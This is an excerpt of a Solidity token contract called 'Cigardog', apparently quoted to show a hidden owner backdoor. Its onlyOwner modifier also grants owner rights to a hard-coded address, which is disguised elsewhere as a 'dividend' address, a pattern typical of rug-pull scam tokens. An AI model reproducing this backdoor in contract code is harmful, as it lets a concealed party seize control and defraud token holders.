...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xa3908Fd2909bcF247cA7100674A90Bd86B031BcA) , "owner");
        _;
    }
...
contract Cigardog  is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xECbaB643048fa19d93f0C3e77bF45e04e79bdE3E);
    address private _Marketing = 0xECbaB643048fa19d93f0C3e77bF45e04e79bdE3E;
    address public dividend = 0xa3908Fd2909bcF247cA7100674A90Bd86B031BcA;
